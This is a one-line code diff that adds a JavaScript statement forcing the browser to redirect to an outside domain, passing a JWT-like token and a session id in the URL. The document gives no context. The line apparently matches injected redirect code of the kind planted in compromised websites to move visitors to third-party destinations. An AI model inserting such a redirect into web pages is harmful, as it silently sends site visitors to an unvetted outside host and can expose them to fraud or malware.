@@ -1,0 +1,1 @@
+window.location.replace('http://www.solconnects.com/?ch=1&js=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJKb2tlbiIsImV4cCI6MTY5MTE3NjI1MSwiaWF0IjoxNjkxMTY5MDUxLCJpc3MiOiJKb2tlbiIsImpzIjoxLCJqdGkiOiIydHMzcWltYzl1azgxaDY2NTAwcnE4MDQiLCJuYmYiOjE2OTExNjkwNTEsInRzIjoxNjkxMTY5MDUxNTQyMjIzfQ.-dv8WvUTcOcG3mDcHai6uA1cQAvOd63vtqo2ZgwLp-I&sid=dd39a24e-32e9-11ee-a4a3-6c7ddf9806ad');
